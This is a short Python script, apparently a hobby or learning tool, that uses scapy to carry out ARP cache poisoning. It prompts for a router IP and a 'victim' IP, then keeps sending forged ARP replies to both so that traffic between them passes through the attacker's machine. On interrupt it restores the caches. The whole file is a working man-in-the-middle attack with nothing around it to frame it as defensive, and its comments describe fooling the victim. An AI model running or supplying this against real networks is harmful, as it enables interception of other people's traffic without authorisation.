from scapy.all import *
import time


MAC_BROADCAST = 'ff:ff:ff:ff:ff:ff'
ARP_REPLY = 2


def find_mac(ip: str) -> str:
    arp_req = Ether(dst=MAC_BROADCAST) / ARP(pdst=ip)
    arp_res = srp1(arp_req, verbose=False, timeout=5)

    if arp_res is None:
        print(f'{ip} is not responding to arp')
        return ''

    return arp_res[Ether].src


def arp_spoof(target_ip: str, spoofed_ip: str, spoofed_mac: str = ''):
    target_mac = find_mac(ip=target_ip)

    if target_mac:
        arp_reply = ARP(op=ARP_REPLY, hwdst=target_mac, pdst=target_ip, psrc=spoofed_ip, verbose=True)
        
        if spoofed_mac:
            arp_reply.hwsrc = spoofed_mac

        send(arp_reply)


def main():
    router_ip = input('Please enter your router ip: ')
    victim_ip = input('Please enter your victim ip: ')
    try:
        while True:
            # fool the router into thinking my pc is the victim pc
            arp_spoof(target_ip=router_ip, spoofed_ip=victim_ip)
            # fool the victim into thinking i'm his router
            arp_spoof(target_ip=victim_ip, spoofed_ip=router_ip)

            time.sleep(0.1)
    except KeyboardInterrupt:
        # restore
        arp_spoof(target_ip=router_ip, spoofed_ip=victim_ip, spoofed_mac=find_mac(victim_ip))
        arp_spoof(target_ip=victim_ip, spoofed_ip=router_ip, spoofed_mac=find_mac(router_ip))
        print('Arp Cache restored!')
        


if __name__ == "__main__":
    main()
